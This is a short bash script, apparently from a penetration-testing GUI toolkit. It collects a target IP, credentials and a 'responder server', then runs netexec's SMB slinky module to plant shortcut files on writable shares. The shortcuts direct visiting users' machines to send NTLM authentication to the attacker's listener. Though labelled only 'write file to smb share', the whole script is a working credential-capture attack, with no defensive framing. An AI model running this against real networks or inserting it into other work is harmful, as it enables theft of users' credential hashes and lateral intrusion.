#!/bin/bash

: '
write file to smb share
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
IP_FIELD=$(form_item  "IP address" "ip")
USERNAME_FIELD=$(form_item  "username" "username")
PASSWORD_FIELD=$(form_item  "password" "password")
RESPONDER_SERVER_FIELD=$(form_item  "responder server" "responder")

# Generate GUI form
generate_form "${IP_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}" "${RESPONDER_SERVER_FIELD}"

IP=${form_data["ip"]}
USERNAME=${form_data["username"]}
PASSWORD=${form_data["password"]}
RESPONDER_SERVER=${form_data["responder"]}

execute_command "netexec smb ${IP} -u '${USERNAME}' -p '${PASSWORD}' -M slinky -o SERVER=${RESPONDER_SERVER} NAME=important"
create_new_line
